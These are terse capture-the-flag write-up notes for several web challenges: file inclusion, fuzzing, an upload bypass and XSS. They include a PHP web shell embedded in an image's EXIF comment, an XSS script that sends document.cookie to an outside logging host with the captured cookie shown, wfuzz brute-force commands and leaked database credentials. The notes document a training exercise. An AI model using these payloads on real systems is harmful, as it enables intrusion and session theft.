## Autodesk Reboot CTF 2018


# James Town Defense lab

File inclusion:
`http://host1.metaproblems.com:4600/retrieve.php?p=../library.php`

We got:
`$mysqli = new mysqli("host1-mysql-db","jdl","xCVT6ZM6aprbQcU6QUPbhW3pWYpTtwbv","jdl");
mydb = mysql.connector.connect(host="host1-mysql-db", user="jdl", passwd="xCVT6ZM6aprbQcU6QUPbhW3pWYpTtwbv")`

Scratch that, we use this pattern:

`\d{4}(-[A-Z\d]{4}){3}-([A-Z][A-Z]){2}`

`1111-B8B8-B8B8-B8B8-AAAA`

> if_i_just_put_these_under_my_pillow_can_i_learn_by_osmosis

# aaa

http://cse.google.com/cse.js?cx=005703438322411770421:5mgshgrgx2u
http://icmpindustries.com/oRdG43

```VABoAGkAcwAgAGkAcwAgAGEAIABsAG8AbgBnACAAbQBlAHMAcwBhAGcAZQAgAHQAaABhAHQAIABjAG8AbgB0AGEAaQBuAHMAIABzAGUAbgBzAGkAdABpAHYAZQAgAGMAbwBtAHAAYQBuAHkAIABkAGEAdABhAC4AIABPAGgAIABuAG8AIQAgAEkAdAAgAGkAcwAgAGIAZQBpAG4AZwAgAGUAeABmAGkAbABlAGQALgAgAFEAdQBpAGMAawAsACAAaABlAHIAZQAgAGkAcwAgAHQAaABlACAAZgBsAGEAZwA6ACAATQBlAHQAYQBDAFQARgB7AGEAYwB0AG8AcgBzAF8AYgBlAF8AZABhAHQAYQBfAGUAeABmAGkAbABpAG4AZwBfAGkAbgBfAGEAbABsAF8AdABoAGUAXwB3AGEAeQBzAH0A

==> This is a long message that contains sensitive company data. Oh no! It is being exfiled. Quick, here is the flag: MetaCTF{actors_be_data_exfiling_in_all_the_ways}

```

# Betrayed by a friend



wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt --hc 404 http://host1.metaproblems.com:4400/FUZZ

found 2 urls:
http://eve-server:5000/images
http://eve-server:5000/accounts
http://eve-server:5000/admins

> "flag": "who_can_you_trust_these_days"

# Just my kind of Type

http://host1.metaproblems.com:4800/uploads/profile_images/vTxUddGZFn/111.php.png?cmd=ls%20../../../../../../


`exiftool -Comment='<?php if(isset($_REQUEST['cmd'])){echo "<pre>";$cmd = ($_REQUEST['cmd']);system($cmd);echo "</pre>";} __halt_compiler();?>' 111.png`

> MetaCTF{your_php_enabled_image/png_is_the_content_to_my_type}

# Neighbor Psychic

Upon viewing the source we find:
http://host1.metaproblems.com:4850/app.js

It will reveal this end point:
http://host1.metaproblems.com:4850/guess

By inspecting the Network traffic i can see:
Werkzeug/1.0.1 Python/3.6.9


WFUZZ:
`wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt --hc 404 http://host1.metaproblems.com:4850/FUZZ`

it will give the /console path

# Start at the Origin
https://blog.decicorp.metacorp.us/preview_comment.php?id=4XljhdgM9Z1xC6BG

<input type="text" class="form-control mb-3" maxlength="30" name="author" required="">
Change to 100

<script>document.location="https://www.nguyenphuoc.net/ctf/cookie.php?c=" + document.cookie + document.domain</script>

```
IP: 34.236.255.12 | PORT: 51439 | HOST:  |  Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36 | METHOD:  | REF: https://blog.decicorp.metacorp.us/preview_comment.php?id=BQxgh7b9wcrZmltJ |  DATE: Wednesday 29th 2020f April 2020 07:06:08 PM | COOKIE:  c=DECICORP_BLOG=debc55d8c31df8d45070a65c5f49810e 
```

wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt --hc 404 FUZZ.google.com

wfuzz -c -z file,./myOutFile.txt --hs incorrect -d "password=FUZZ" http://host1.metaproblems.com:4850/super_secret_page_with_flags

